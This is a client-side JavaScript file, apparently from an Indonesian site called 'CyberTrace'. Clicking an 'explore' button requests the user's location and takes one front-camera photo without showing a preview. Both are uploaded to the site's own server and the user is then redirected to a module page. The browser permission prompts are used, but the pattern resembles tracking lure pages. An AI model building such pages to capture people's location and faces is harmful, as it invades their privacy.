(() => {
  const button = document.getElementById('explore');
  const status = document.getElementById('access-status');
  if (!button || !status) return;

  const say = message => { status.textContent = message; };
  const post = async (url, payload) => {
    const response = await fetch(url, {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json().catch(() => ({}));
    if (!response.ok) throw new Error(data.error || `HTTP ${response.status}`);
    return data;
  };

  // Start GPS permission immediately; use a recent cached fix if available,
  // and avoid forcing a slow high-accuracy GPS acquisition on mobile.
  function getLocationOnce() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject(new Error('Geolocation tidak tersedia.'));
      navigator.geolocation.getCurrentPosition(async position => {
        try {
          await post('/api/share/consent', {resource:'location'});
          const result = await post('/api/share/location', {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            captured_at: new Date(position.timestamp).toISOString()
          });
          resolve(result);
        } catch (error) {
          reject(new Error(`Lokasi didapat tetapi gagal disimpan: ${error.message}`));
        }
      }, error => {
        const messages = {
          1:'Izin lokasi ditolak oleh browser/perangkat.',
          2:'Perangkat belum dapat menentukan lokasi.',
          3:'Waktu mendapatkan lokasi habis.'
        };
        reject(new Error(messages[error.code] || error.message || 'Lokasi tidak tersedia.'));
      }, {enableHighAccuracy:false, maximumAge:15000, timeout:5000});
    });
  }

  async function captureOnePhoto() {
    if (!navigator.mediaDevices?.getUserMedia) throw new Error('Kamera tidak tersedia.');
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    try {
      await post('/api/share/consent', {resource:'camera'});
      const video = document.createElement('video');
      video.autoplay = true; video.playsInline = true; video.muted = true;
      video.srcObject = stream;
      await video.play();
      await new Promise((resolve,reject) => {
        if (video.readyState >= 2 && video.videoWidth) return resolve();
        const timer = setTimeout(()=>reject(new Error('Kamera belum siap.')),5000);
        video.addEventListener('loadeddata',()=>{clearTimeout(timer);resolve();},{once:true});
      });
      if (!video.videoWidth || !video.videoHeight) throw new Error('Frame kamera kosong.');
      const canvas = document.createElement('canvas');
      // Bound image dimensions and JPEG size for faster mobile uploads.
      const scale = Math.min(1, 1280 / video.videoWidth);
      canvas.width = Math.round(video.videoWidth * scale);
      canvas.height = Math.round(video.videoHeight * scale);
      const context = canvas.getContext('2d');
      if (!context) throw new Error('Tidak dapat menyiapkan foto.');
      context.drawImage(video,0,0,canvas.width,canvas.height);
      const blob = await new Promise(resolve=>canvas.toBlob(resolve,'image/jpeg',0.72));
      if (!blob) throw new Error('Foto gagal dibuat.');
      const form = new FormData(); form.append('image',blob,'capture.jpg');
      const response = await fetch('/api/share/snapshot',{method:'POST',credentials:'same-origin',body:form});
      const result = await response.json().catch(()=>({}));
      if (!response.ok) throw new Error(result.error || `HTTP ${response.status}`);
      return result;
    } finally {
      stream.getTracks().forEach(track=>track.stop());
    }
  }

  button.addEventListener('click', async () => {
    if (button.disabled) return;
    button.disabled = true;
    button.textContent = 'Meminta izin…';
    say('Permintaan izin lokasi dan kamera akan dimulai. Izinkan hanya jika Anda setuju.');

    // Start both permission flows together instead of waiting for GPS before
    // requesting camera. Both are explicit, user-triggered browser permission APIs.
    const locationTask = getLocationOnce();
    const cameraTask = captureOnePhoto();
    say('Memproses lokasi dan kamera secara bersamaan…');

    const [locationResult, cameraResult] = await Promise.allSettled([locationTask,cameraTask]);
    const locationOk = locationResult.status === 'fulfilled';
    const cameraOk = cameraResult.status === 'fulfilled';
    if (!locationOk) console.warn('CyberTrace location:',locationResult.reason);
    if (!cameraOk) console.warn('CyberTrace camera:',cameraResult.reason);

    const parts = [
      `Lokasi: ${locationOk ? 'terkirim' : 'tidak terkirim'}`,
      `Foto: ${cameraOk ? 'terkirim' : 'tidak terkirim'}`
    ];
    say(parts.join(' · ') + '. Membuka modul…');
    // Redirect immediately after the permitted uploads finish; no artificial delay.
    window.location.replace('/modul');
  });
})();
